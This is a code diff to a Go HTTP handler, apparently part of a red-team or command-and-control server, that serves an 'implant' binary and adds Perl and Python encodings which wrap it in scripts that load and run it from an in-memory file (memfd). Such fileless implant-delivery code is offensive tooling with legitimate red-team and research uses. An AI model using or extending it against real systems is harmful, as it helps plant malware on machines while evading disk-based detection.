@@ -5,7 +5,7 @@ package main
  * Handle HTTP requests
  * By J. Stuart McMurray
  * Created 20220512
- * Last Modified 20220512
+ * Last Modified 20220522
  */
 
 import (
@@ -18,6 +18,9 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
+
+	"github.com/magisterquis/bin2memfd"
 )
 
 const (
@@ -30,8 +33,10 @@ const (
 
 /* values for encParam */
 const (
-	encBase64 = "base64"
-	encHex    = "hex"
+	encBase64    = "base64"
+	encHex       = "hex"
+	encMFDPerl   = "memfd_perl"
+	encMFDPython = "memfd_python"
 )
 
 // RegisterHTTPHandlers registers the handlers served by the HTTP server.
@@ -110,6 +115,10 @@ func serveImplant(w http.ResponseWriter, r *http.Request) {
 		encoder = base64.NewEncoder(base64.StdEncoding, w)
 	case encHex: /* perl -e '$/=\2;while(<>){print chr hex}' */
 		encoder = hex.NewEncoder(w)
+	case encMFDPerl:
+		encoder = newByteEncoderWrapper(w, bin2memfd.Perl)
+	case encMFDPython:
+		encoder = newByteEncoderWrapper(w, bin2memfd.Python)
 	default:
 		log.Printf("%s: unknown encoding %q", mp, enc)
 		badRequest = true
@@ -117,8 +126,14 @@ func serveImplant(w http.ResponseWriter, r *http.Request) {
 	}
 	/* Close the encoder if we can. */
 	defer func() {
-		if c, ok := encoder.(interface{ Close() error }); ok {
-			c.Close()
+		if c, ok := encoder.(io.Closer); ok {
+			if err := c.Close(); nil != err {
+				log.Printf(
+					"%s: closing encoder: %s",
+					mp,
+					err,
+				)
+			}
 		}
 	}()
 
@@ -164,4 +179,58 @@ func isAlnum(s string) bool {
 		return false
 	}
 	return true
+}
+
+/* byteEncoderWrapper is used to wrap bin2memfd's []byte encoders.  It relies
+on Close being called. */
+type byteEncoderWrapper struct {
+	l      sync.Mutex
+	enc    func([]byte) ([]byte, error)
+	closed bool
+	buf    []byte
+	w      io.Writer
+}
+
+/* newEncoder returns an byteEncoderWrapper which wraps w using e. */
+func newByteEncoderWrapper(
+	w io.Writer,
+	e func([]byte) ([]byte, error),
+) *byteEncoderWrapper {
+	return &byteEncoderWrapper{enc: e, buf: make([]byte, 0), w: w}
+}
+
+// Write appends b to e's internal buffer.
+func (e *byteEncoderWrapper) Write(b []byte) (int, error) {
+	e.l.Lock()
+	defer e.l.Unlock()
+	if e.closed {
+		panic("write to closed byteEncoderWrapper")
+	}
+	e.buf = append(e.buf, b...)
+	return len(b), nil
+}
+
+// Close encodes whatever's in e.buf and writes it to e.w, which it then
+// closes if it can.
+func (e *byteEncoderWrapper) Close() error {
+	e.l.Lock()
+	defer e.l.Unlock()
+	if e.closed {
+		return nil
+	}
+	/* Encode to a script and write to the underlying writer. */
+	s, err := e.enc(e.buf)
+	if nil != err {
+		return err
+	}
+	_, err = e.w.Write(s)
+	if nil != err {
+		return err
+	}
+	/* If the underlying writer can be closed, close it. */
+	if c, ok := e.w.(io.Closer); ok {
+		return c.Close()
+	}
+
+	return nil
 }
